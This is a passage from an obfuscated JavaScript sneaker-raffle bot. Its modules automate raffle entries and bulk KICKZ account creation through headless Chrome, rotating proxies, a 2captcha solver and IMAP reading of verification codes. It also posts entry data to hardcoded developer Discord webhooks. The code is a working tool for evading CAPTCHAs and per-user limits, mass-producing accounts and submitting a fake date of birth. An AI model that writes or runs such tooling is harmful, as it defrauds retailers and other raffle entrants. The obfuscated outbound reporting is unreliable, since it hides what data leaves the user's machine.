                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x50b722['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1f5435
                            }
                        ]
                    }];
                    const _0x1bb7ed = { 'embeds': _0x5185fd };
                    _0x3b7620(_0x25daca['name'] + '\x20Task\x20' + (_0x3352dc + 0x1) + '\x20/\x20' + _0x4acff3['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                    try {
                        await _0x559c6d(_0x4acff3, _0x3352dc);
                    } catch {
                        _0x4b719c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x13b944 = await _0xc964cf(_0x4acff3[_0x3352dc], _0x25daca, 'dev', ![]), _0xb7da83 = await _0xc964cf(_0x4acff3[_0x3352dc], _0x25daca, 'pub', ![]);
                    const _0x2545da = {
                        'succesDEVMSG': { 'embeds': [_0x13b944] },
                        'succesPUBMSG': { 'embeds': [_0xb7da83] }
                    };
                    if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                        try {
                            await _0x33437b(_0x50b722['webhook'], _0x2545da['succesDEVMSG']);
                        } catch {
                        }
                    await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x2545da['succesDEVMSG']), await _0xfa5357(0xc8);
                    try {
                        await _0x33437b(_0x471d14, _0x2545da['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x4acff3[_0x3352dc]['Email'] == '' || _0x4acff3[_0x3352dc]['Url'] == '' || _0x4acff3[_0x3352dc]['FirstName'] == '' || _0x4acff3[_0x3352dc]['LastName'] == '') {
                        console['log'](_0x391006() + '\x20[' + _0x241653[taskModule]['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x50b722['useRandomProxy'] = ![])
                        var _0x463391 = _0x4ea5d2[_0x3352dc]['split'](':');
                    else
                        var _0x1d6777 = Math['round'](Math['random']() * (_0x4ea5d2['length'] - 0x1)), _0x463391 = _0x4ea5d2[_0x1d6777]['split'](':');
                    var _0x345150;
                    try {
                        _0x345150 = await _0x1528cf['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x463391[0x0] + ':' + _0x463391[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x345150 = await _0x1528cf['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x463391[0x0] + ':' + _0x463391[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0xf45109 = await _0x345150['newPage']();
                        await _0xf45109['authenticate']({
                            'username': '' + _0x463391[0x2],
                            'password': '' + _0x463391[0x3]
                        }), console['log'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20Getting\x20Session'), await _0xf45109['setRequestInterception'](!![]), _0xf45109['on']('request', _0x4de5ef => {
                            _0x4de5ef['resourceType']() === 'image' || _0x4de5ef['resourceType']() === 'font' || _0x4de5ef['resourceType']() === 'media' ? _0x4de5ef['abort']() : _0x4de5ef['continue']();
                        });
                        try {
                            await _0xf45109['goto']('' + _0x4acff3[_0x3352dc]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0xf45109['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20Filling\x20Information'), await _0xf45109['type']('#comp_firstname', '' + _0x4acff3[_0x3352dc]['FirstName']), await _0xf45109['waitForSelector']('#comp_lastname'), await _0xf45109['type']('#comp_lastname', '' + _0x4acff3[_0x3352dc]['LastName']), await _0xf45109['waitForSelector']('#comp_email'), await _0xf45109['type']('#comp_email', '' + _0x4acff3[_0x3352dc]['Email']), await _0xf45109['waitForSelector']('#comp_paypalemail'), await _0xf45109['type']('#comp_paypalemail', '' + _0x4acff3[_0x3352dc]['Email']), await _0xf45109['waitForSelector']('#comp_mobile_end'), await _0xf45109['type']('#comp_mobile_end', '' + _0x4acff3[_0x3352dc]['Phone']), await _0xf45109['waitForSelector']('#comp_dob'), await _0xf45109['type']('#comp_dob', '08/09/1992'), console['log'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x4acff3[_0x3352dc]['Size'] == 'RANDOM') {
                            const _0x306476 = await _0xf45109['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x4ff2a9 => {
                                return _0x4ff2a9['map'](_0x3a3ba3 => _0x3a3ba3['value']);
                            });
                            var _0x1060a5 = Math['round'](Math['random']() * (_0x306476['length'] - 0x2));
                            await _0xf45109['select']('#shoesize', _0x306476[_0x1060a5 + 0x1]), await _0xfa5357(0x3e8);
                        } else {
                            const _0xa3d750 = await _0xf45109['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x59d51d => {
                                return _0x59d51d['map'](_0x152b48 => _0x152b48['innerText']);
                            }), _0xf2a1fa = await _0xf45109['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3b95fa => {
                                return _0x3b95fa['map'](_0x30ca6b => _0x30ca6b['value']);
                            });
                            var _0x23326e = _0x4acff3[_0x3352dc]['Size'];
                            for (var _0x4378d7 = 0x1; _0x4378d7 < _0xf2a1fa['length']; _0x4378d7++) {
                                var _0x562cee = _0xa3d750[_0x4378d7]['split']('\x20')[0x0];
                                if (_0x562cee == _0x23326e) {
                                    await _0xf45109['select']('#shoesize', _0xf2a1fa[_0x4378d7]);
                                    break;
                                } else {
                                    if (_0x4378d7 + 0x1 == _0xf2a1fa['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0xf45109['waitForSelector']('#comp_address1'), await _0xf45109['type']('#comp_address1', _0x4acff3[_0x3352dc]['Address1'] + '\x20' + _0x4acff3[_0x3352dc]['HouseNumber']), await _0xf45109['waitForSelector']('#comp_address2'), await _0xf45109['type']('#comp_address2', '' + _0x4acff3[_0x3352dc]['Address2']), await _0xf45109['waitForSelector']('#comp_address2'), await _0xf45109['type']('#comp_address3', '' + _0x4acff3[_0x3352dc]['City']), await _0xf45109['waitForSelector']('#comp_postcode'), await _0xf45109['type']('#comp_postcode', '' + _0x4acff3[_0x3352dc]['Zip']), console['log'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xfa5357(0x4b0), await _0xf45109['click']('label#emailhold'), await _0xfa5357(0x5dc), await _0xf45109['click']('#preauth_tandc_email\x20>\x20label'), await _0xfa5357(0x5dc), await _0xf45109['click']('#submit');
                        try {
                            await _0xf45109['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20' + _0x34d98c['blue']('Awaiting\x20Paypal\x20Payment')), _0x345150['on']('targetcreated', async _0x4de365 => {
                            if (_0x4de365['type']() === 'page') {
                                const _0x27158a = await _0x4de365['page']();
                                async function _0x310a32() {
                                    try {
                                        await _0xf45109['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x144720 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x1a5f5e() {
                                    try {
                                        await _0xf45109['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x47176c = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x1a5f5e(), _0x310a32(), await _0xfa5357(0x493e0);
                            }
                        });
                        async function _0x10a996() {
                            for (let _0x388162 = 0x0; _0x388162 < 0x12c; _0x388162++) {
                                if (_0x47176c == !![]) {
                                    _0x4b719c = 'no', _0x253d32(_0x4acff3[_0x3352dc], _0x25daca), console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '')
                                        try {
                                            await _0x33437b(_0x50b722['webhook'], _0x2545da['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xfa5357(0xc8), await _0x33437b(_0xee2818, _0x2545da['succesDEVMSG']), await _0xfa5357(0xc8);
                                    try {
                                        await _0x33437b(_0x471d14, _0x2545da['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x144720)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xfa5357(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xfa5357(0xbb8), await _0xf45109['click']('.zoid-outlet'), await _0xfa5357(0x7d0), await _0x10a996();
                    } catch (_0x7d09df) {
                        console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20' + _0x7d09df)), _0x56a9d3 = '' + _0x7d09df;
                        var _0x26ed68 = await _0xc964cf(_0x4acff3[_0x3352dc], _0x25daca, 'dev', !![], _0x56a9d3);
                        _0x2545da['errorDEV'] = { 'embeds': [_0x26ed68] }, _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x2545da['errorDEV']), await _0x33437b(_0x5e1645, _0x2545da['errorDEV']);
                    } finally {
                        _0x345150 && _0x345150['close']();
                        if (_0x4b719c == 'yes' && _0x11e8c6 != 0x5 && _0x56a9d3 != 'Size\x20Not\x20Found') {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x25daca['name'] + ']\x20Task\x20' + (_0x3352dc + 0x1) + '\x20:\x20Retrying\x20(' + _0x11e8c6 + '\x20/\x205)')), _0x3352dc = _0x3352dc - 0x1, _0x11e8c6 = _0x11e8c6 + 0x1;
                            continue;
                        }
                        _0x4b719c == 'yes' && _0x11e8c6 >= 0x5 && (_0x3003c7(afew[_0x3352dc], _0x25daca), _0x4b719c = 'no', _0x11e8c6 = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x4579d5, _0x8ed7eb, _0x40b6d3) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x8e291e = 0x0; _0x8e291e < _0x8ed7eb['length']; _0x8e291e++) {
                        const _0x792a63 = 'https://www.kickz.com/login';
                        if (_0x44a41d != 'yes')
                            var _0x44a41d = '', _0x4c6084 = 0x0;
                        _0x3b7620(_0x4579d5['name'] + '\x20Task\x20' + (_0x8e291e + 0x1) + '\x20/\x20' + _0x8ed7eb['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        try {
                            await _0x559c6d(_0x8ed7eb, _0x8e291e);
                        } catch {
                            _0x44a41d = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x373c8c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ee077
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x50b722['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1f5435
                                }
                            ]
                        }];
                        const _0xe89087 = { 'embeds': _0x373c8c };
                        var _0x5200eb = await _0xc964cf(_0x8ed7eb[_0x8e291e], _0x4579d5, 'acc', ![]);
                        const _0x3175a2 = { 'succesDEVMSG': { 'embeds': [_0x5200eb] } };
                        if (_0x8ed7eb[_0x8e291e]['Email'] == '' || _0x8ed7eb[_0x8e291e]['FirstName'] == '' || _0x8ed7eb[_0x8e291e]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x8ed7eb[_0x8e291e]['Password'] == '' && (_0x8ed7eb[_0x8e291e]['Password'] = 'JRaffles23!');
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x4769db = _0x40b6d3[_0x8e291e]['split'](':');
                        else
                            var _0x2e1202 = Math['round'](Math['random']() * (_0x40b6d3['length'] - 0x1)), _0x4769db = _0x40b6d3[_0x2e1202]['split'](':');
                        var _0x34def9;
                        try {
                            _0x34def9 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4769db[0x0] + ':' + _0x4769db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x34def9 = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4769db[0x0] + ':' + _0x4769db[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x574989 = await _0x34def9['newPage']();
                            await _0x574989['authenticate']({
                                'username': '' + _0x4769db[0x2],
                                'password': '' + _0x4769db[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x574989['setRequestInterception'](!![]), _0x574989['on']('request', _0x9bac4f => {
                                _0x9bac4f['resourceType']() === 'image' || _0x9bac4f['resourceType']() === 'font' || _0x9bac4f['resourceType']() === 'media' ? _0x9bac4f['abort']() : _0x9bac4f['continue']();
                            }), await _0x574989['goto'](_0x792a63), await _0xfa5357(0xbb8), console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x574989['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x574989['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x574989['waitForSelector']('#button-register'), await _0xfa5357(0x7d0), await _0x574989['evaluate'](() => {
                                const _0x594b45 = document['querySelector']('#button-register');
                                _0x594b45['click']();
                            }), console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xfa5357(0x1388), await _0x574989['waitForSelector']('#customer_salutation'), await _0x574989['select']('#customer_salutation', 'mr'), await _0xfa5357(0x7d0), await _0x574989['waitForSelector']('#customer_firstname'), await _0x574989['type']('#customer_firstname', '' + _0x8ed7eb[_0x8e291e]['FirstName']), await _0xfa5357(0x352), await _0x574989['waitForSelector']('#customer_lastname'), await _0x574989['type']('#customer_lastname', '' + _0x8ed7eb[_0x8e291e]['LastName']), await _0xfa5357(0x352), await _0x574989['type']('#email-input', '' + _0x8ed7eb[_0x8e291e]['Email']), await _0xfa5357(0x352), await _0x574989['type']('#email-confirm-input', '' + _0x8ed7eb[_0x8e291e]['Email']), await _0xfa5357(0x352), await _0x574989['type']('#register-password', '' + _0x8ed7eb[_0x8e291e]['Password']), await _0xfa5357(0x352), await _0x574989['type']('#password-confirm', '' + _0x8ed7eb[_0x8e291e]['Password']), await _0xfa5357(0x352), console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x574989['click']('#consent'), await _0xfa5357(0x1f4);
                            const _0x3eff0b = await _0x574989['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x3eff0b) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x574989['click']('#buttonRegister');
                            try {
                                await _0x574989['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x8ed7eb[_0x8e291e]['Email']), await _0xfa5357(0x4b0);
                            async function _0x16da9e() {
                                var _0xa4f96b, _0x38b355 = ![];
                                for (var _0x50c626 = 0x0; _0x50c626 < 0x18; _0x50c626++) {
                                    async function _0x141c0e() {
                                        var _0x12b859 = new _0x108c6b({
                                            'user': _0x50b722['masterMail'],
                                            'password': _0x50b722['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x37e2d4(_0x10be1d) {
                                            _0x12b859['openBox']('INBOX', ![], _0x10be1d);
                                        }
                                        _0x12b859['once']('ready', function () {
                                            console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x37e2d4(function (_0x59228a, _0x5f3988) {
                                                console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x59228a)
                                                    throw _0x59228a;
                                                _0x12b859['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x478381, _0x17e5aa) {
                                                    if (!_0x17e5aa || !_0x17e5aa['length'])
                                                        console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x12b859['end']();
                                                    else {
                                                        var _0x782980 = _0x12b859['seq']['fetch'](_0x17e5aa, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x782980['on']('message', function (_0x564528, _0x1187cc) {
                                                            var _0x31b085 = '(#' + _0x1187cc + ')\x20';
                                                            _0x564528['on']('body', function (_0x550ed4, _0x1c4da2) {
                                                                _0x2e7895(_0x550ed4, (_0x1f5907, _0x13eb3e) => {
                                                                    if (_0x13eb3e['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x318446 = _0x13eb3e['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x5b5009 = _0x318446[0x1]['split']('<')[0x0];
                                                                        _0xa4f96b = _0x5b5009;
                                                                    }
                                                                });
                                                            }), _0x564528['once']('end', function () {
                                                            });
                                                        }), _0x782980['once']('error', function (_0x389a77) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x782980['once']('end', function () {
                                                            _0x12b859['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x12b859['once']('error', function (_0x321212) {
                                            console['log'](_0x34d98c['red'](_0x321212['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x38b355 = !![];
                                        }), _0x12b859['once']('end', async function () {
                                        }), _0x12b859['connect']();
                                    }
                                    _0x141c0e(), await _0xfa5357(0x1388);
                                    if (_0xa4f96b)
                                        return _0xa4f96b;
                                    if (_0x38b355)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x50c626 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x16da9e(), _0xfa5357(0x320), console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Verifying..'), await _0x574989['type']('#verificationCode', code), await _0xfa5357(0x1f4), await _0x574989['click']('#buttonVerify'), await _0xfa5357(0x190), await _0x574989['click']('#buttonVerify'), await _0xfa5357(0x3e8);
                            try {
                                await _0x574989['waitForSelector']('div.b-user_greeting'), _0x44a41d = 'no', console['log'](_0x34d98c['green'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Account\x20' + _0x8ed7eb[_0x8e291e]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x13dabd['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x8ed7eb[_0x8e291e]['Email'] + ',' + _0x8ed7eb[_0x8e291e]['Password'] + ','), console['log'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Account\x20' + _0x8ed7eb[_0x8e291e]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x50b722['webhook'] != undefined && _0x50b722['webhook'] != '' && await _0x33437b(_0x50b722['webhook'], _0x3175a2['succesDEVMSG']);
                                } catch {
                                }
                                await _0x33437b(_0x96b204, _0x3175a2['succesDEVMSG']);
                            } catch {
                                _0x44a41d = 'no', console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x31f29d) {
                            console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20' + _0x31f29d)), _0x373c8c[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x373c8c[0x0]['description'] = '' + _0x31f29d, await _0x33437b(_0x5e1645, _0xe89087), _0x44a41d = 'yes';
                        } finally {
                            _0x34def9 && _0x34def9['close']();
                            if (_0x44a41d == 'yes' && _0x4c6084 != 0x5) {
                                console['log'](_0x34d98c['red'](_0x391006() + '\x20[' + _0x4579d5['name'] + ']\x20Task\x20' + (_0x8e291e + 0x1) + '\x20:\x20Retrying\x20(' + _0x4c6084 + '\x20/\x205)')), _0x8e291e = _0x8e291e - 0x1, _0x4c6084 = _0x4c6084 + 0x1;
                                continue;
                            }
                            _0x44a41d == 'yes' && _0x4c6084 >= 0x5 && (_0x3003c7(_0x8ed7eb[_0x8e291e], _0x4579d5), _0x44a41d = 'no', _0x4c6084 = 0x0), console['log']('Waiting\x20for\x20' + _0x50b722['delay'] + '\x20ms'), await _0xfa5357(_0x50b722['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x31be13, _0x1c9b59, _0x57a22c) {
                    _0x1528cf['use'](_0x3af7cd()), _0x1528cf['use'](_0x2a16d3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x50b722['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xb1ccd4 = 0x0; _0xb1ccd4 < _0x1c9b59['length']; _0xb1ccd4++) {
                        var _0x129dcc;
                        if (_0x1dd997 != 'yes')
                            var _0x1dd997 = '', _0x4e7f0a = 0x0;
                        _0x3b7620(_0x31be13['name'] + '\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20/\x20' + _0x1c9b59['length'] + '\x20||\x20File:\x20' + _0x55dc9b + '\x20Proxies:\x20' + _0x40851);
                        var _0x156158 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4ee077
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x1c9b59[_0xb1ccd4]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x1c9b59[_0xb1ccd4]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x50b722['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1f5435
                                }
                            ]
                        }], _0x2dcae3 = await _0xc964cf(_0x1c9b59[_0xb1ccd4], _0x31be13, 'dev', ![]), _0x5040a1 = await _0xc964cf(_0x1c9b59[_0xb1ccd4], _0x31be13, 'pub', ![]);
                        const _0x57b1f2 = {
                            'succesDEVMSG': { 'embeds': [_0x2dcae3] },
                            'succesPUBMSG': { 'embeds': [_0x5040a1] }
                        };
                        try {
                            await _0x559c6d(_0x1c9b59, _0xb1ccd4);
                        } catch {
                            _0x1dd997 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x1c9b59[_0xb1ccd4]['Email'] == '' || _0x1c9b59[_0xb1ccd4]['Password'] == '' || _0x1c9b59[_0xb1ccd4]['FirstName'] == '' || _0x1c9b59[_0xb1ccd4]['LastName'] == '') {
                            console['log'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x50b722['useRandomProxy'] = ![])
                            var _0x35dead = _0x57a22c[_0xb1ccd4]['split'](':');
                        else
                            var _0x51b5ec = Math['round'](Math['random']() * (_0x57a22c['length'] - 0x1)), _0x35dead = _0x57a22c[_0x51b5ec]['split'](':');
                        var _0x19b4ca;
                        try {
                            _0x19b4ca = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x35dead[0x0] + ':' + _0x35dead[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x19b4ca = await _0x1528cf['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x35dead[0x0] + ':' + _0x35dead[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x14135c = await _0x19b4ca['newPage']();
                            await _0x14135c['authenticate']({
                                'username': '' + _0x35dead[0x2],
                                'password': '' + _0x35dead[0x3]
                            }), console['log'](_0x391006() + '\x20[' + _0x31be13['name'] + ']\x20Task\x20' + (_0xb1ccd4 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x14135c['setRequestInterception'](!![]), _0x14135c['on']('request', _0x10935f => {
                                _0x10935f['resourceType']() === 'image' || _0x10935f['resourceType']() === 'font' || _0x10935f['resourceType']() === 'media' ? _0x10935f['abort']() : _0x10935f['continue']();
                            }), await _0x14135c['goto']('' + _0x1c9b59[_0xb1ccd4]['Url'], { 'waitUntil': 'networkidle2' }), await _0xfa5357(0x12c), await _0x14135c['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x14135c['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0xfa5357(0x7d0);
                            try {
                                await _0x14135c['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x14135c['click']('a[title=\x22sign\x20in\x22]');
                            }
